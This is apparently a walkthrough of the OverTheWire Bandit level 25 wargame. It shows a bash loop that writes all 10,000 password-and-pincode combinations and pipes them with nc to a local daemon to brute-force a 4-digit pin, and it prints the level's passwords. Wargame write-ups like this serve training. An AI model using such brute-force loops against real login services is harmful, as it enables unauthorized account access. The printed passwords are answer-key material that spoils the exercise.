## Bandit Level 25 — Brute Forcing the Pincode

### Description

A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a **secret numeric 4-digit pincode**. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

### Walkthrough

Let’s try to connect to the daemon using `nc`:
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```
Ok let's brute-force the pincode.
First we need to make all of the possible combinations:
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.3G87r5649B$
bandit24@bandit:~$ cd /tmp/tmp.3G87r5649B
bandit24@bandit:/tmp/tmp.3G87r5649B$ vim script.sh
```
I wrote this script to make all the password + pincode combinations and store it in a file:
```bash
#!/bin/bash

password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for pin in $(seq -w 0000 9999); do
        echo "$password $pin" >> combinations.txt
done
```
Now we need to feed this file to the daemon:
```bash
bandit24@bandit:/tmp/tmp.3G87r5649B$ nc localhost 30002 < combinations.txt
...
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```
Perfect we got the password but I'm curious what was the pincode:
```bash
bandit24@bandit:/tmp/tmp.3G87r5649B$ nc localhost 30002 < combinations.txt | wc -l
2223
```
- `wc -l` tells us how many lines of output were produced by the command, which almost corresponds to the number of attempts made to guess the pincode.

Hmm, if we omit the blank line, the password line and the `Correct` message line, we can guess that `2220` pincodes were tried to reach the correct pincode; meaning the pincode is `2219` (because the pincode combinations started from `0000`).
```bash
bandit24@bandit:/tmp/tmp.3G87r5649B$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 2219
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```